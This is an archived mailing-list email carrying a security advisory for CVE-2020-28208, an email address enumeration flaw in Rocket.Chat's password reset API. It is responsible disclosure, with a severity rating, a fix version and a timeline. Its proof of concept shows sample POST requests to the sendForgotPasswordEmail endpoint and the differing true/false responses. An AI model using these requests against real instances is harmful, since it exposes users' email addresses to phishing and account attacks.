X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5211" "Friday" "8" "January" "2021" "10:11:22" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" "<nOtVB6IX8HgEDMTZRoSF8T27q70YAYS_B_0y9-R3vMdfdPNlhYXTJ9VZ78Q-K0OVzg4QuofyWufiLNnN-sjThgbinm-sWfVGnPLtJ_ovWL8=@trovent.io>" "172" "[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" nil nil nil "1" "2021010810:11:22" "[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" (number mark "U       s.pietsch@tr Jan  8  172/5211  " thread-indent "\"[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 24444 invoked by uid 550); 8 Jan 2021 11:00:33 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 14126 invoked from network); 8 Jan 2021 10:11:39 -0000
Date: Fri, 08 Jan 2021 10:11:22 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
	s=protonmail2; t=1610100687;
	bh=wwpcxok3m/DTnQMCHjyUeMwIQM72OaOXfezVp7w0OxU=;
	h=Date:To:From:Reply-To:Subject:From;
	b=sSTqez++vIGza0UIxbGHCpuNHfg/1whnyQSZKK5ShMuKnBw+suwh2VuRzrTdtJu12
	 7v8FQ2DZlyRGhO1tDxb4X4c99uC+ZqybUr1UE8VkTbVGzhdrXbuOg3vfF0vVn7R4yZ
	 fsb8FhAcucB0JyDhqm6odvhNZdSlFthUeFyAJAm2QzpEwflN/VrCPiWPSQaTuuA50i
	 bpoyFSymoYTcuJLRtATOw9YcLmO3mI/w7JPUHW/H9mbLWGn0WgTzMV5X5YgSSB4L3l
	 RZT4JWztszLgLw+17XCr2QCxOq2A+GI9IXNPjpsQ1zt8qOBeZGyRfKWwc0Hf9hoG4F
	 //dRHsalcYYgQ==
To: "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>, "submissions@packetstormsecurity.com" <submissions@packetstormsecurity.com>
From: Stefan Pietsch <s.pietsch@trovent.io>
Message-ID: <nOtVB6IX8HgEDMTZRoSF8T27q70YAYS_B_0y9-R3vMdfdPNlhYXTJ9VZ78Q-K0OVzg4QuofyWufiLNnN-sjThgbinm-sWfVGnPLtJ_ovWL8=@trovent.io>
MIME-Version: 1.0
Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="---------------------8b1bc5714d641665f012c6906d482359"; charset=utf-8
Subject: [oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability

-----------------------8b1bc5714d641665f012c6906d482359
Content-Type: multipart/mixed;boundary=---------------------7f2448a748505027571f874186f31f04

-----------------------7f2448a748505027571f874186f31f04
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;charset=utf-8

# Trovent Security Advisory 2010-01 #
#####################################


Email address enumeration in reset password
###########################################


Overview
########

Advisory ID: TRSA-2010-01
Advisory version: 1.1
Advisory status: Public
Advisory URL: https://trovent.io/security-advisory-2010-01
Affected product: Web application Rocket.Chat
Affected version: <=3D 3.7.1
Vendor: Rocket.Chat Technologies Corp., https://rocket.chat
Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch


Detailed description
####################

Trovent Security GmbH discovered an email address enumeration vulnerability
in the password reset function of the chat application Rocket.Chat. This vu=
lnerability lets
an unauthorized user enumerate registered email addresses on the instance o=
f Rocket.Chat.

Severity: Medium
CVSS Score: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
CVE ID: CVE-2020-28208
CWE ID: CWE-204


Proof of concept
################

Sample HTTP request sent with a registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 122
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"pa=
rams\":[\"positive@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

The server response to a valid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:01:25 GMT
Connection: keep-alive
Content-Length: 78

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":tr=
ue}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

Sample HTTP request sent with a non registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 119
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"pa=
rams\":[\"false@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

The server response to an invalid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:03:08 GMT
Connection: keep-alive
Content-Length: 79

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":t=
rue}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


Solution / Workaround
#####################

Ensure the application returns consistent generic server responses independ=
ent
of the email address entered during the password reset process.

Fixed in Rocket.Chat version 3.9.2.


History
#######

2020-10-27: Vulnerability found
2020-11-03: Advisory created and CVE ID requested
2020-11-06: Vendor contacted and informed about planned disclosure date
2020-11-06: Vendor confirmed vulnerability, working on a fix
2021-01-07: Advisory published
2021-01-08: Vendor sent us information about fixed version

-----------------------7f2448a748505027571f874186f31f04--

-----------------------8b1bc5714d641665f012c6906d482359
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: ProtonMail

wsFzBAEBCAAGBQJf+C+7ACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
/h6FjreQWw//U5cUoJ2oo+XG+YKYGGvz8witEG0lUMA43eeqG5Tj9tBIDVCe
BKJbhrNHXOUD1Gtc7tM+owOoNjqgOY6EwPO3i/S+bKRQbNhXm8PwfPl/63GG
v0KwwnxlFGyA79YbkBHvLJAfq3uQelUJROM9AtAgi17QwpWc9p07DFmR3Hyc
w8EVi0aE6Q7Vs+lOOt4RyklKd+4xp3rn5KTjUNN8/ZfXTQaRe5YFeFojg9LR
qcS/DJF7QkAsxePAB/ufILbhmIdeXn1cd3MLFLZM8m6OcO1MLnVdiwgeP5MW
2WDHEUmNu/+6ZMRMFCvFYDi3zW7gFGDDDYpoXAbcsNGRlHlDemiaBfaNw9wQ
bNvvT7Y94uK8jUqKDHI/4ckCtfusU5lcftpzU3I67ljHCWnidXkMUD2m08YP
MZg18tBXUDS7OZSDVpiG618YbBoCWhHqRg6cnMkLJE6z98EBdDuZ9Oes/fgE
lUaqQlbzhjfGtxmqCLn89JIa8xCWBkMi2pNQcmV4CmO9mQh7fsyPbxKwtbde
tSJEhWlZvVSY5+w9NY6cKzqoIP76tnyx/mFxVuCOHDZNk1aJpq/GwTeKMc3m
0cz8whaxmHiyhnLFWUhyF6HPYnK3vXX4zZeyioYCylzO6b0ZzDGS6hpEj7JX
e3/+FjBJ8dnrPig15RahTMAq81TOWvztlF8=
=LAJk
-----END PGP SIGNATURE-----


-----------------------8b1bc5714d641665f012c6906d482359--

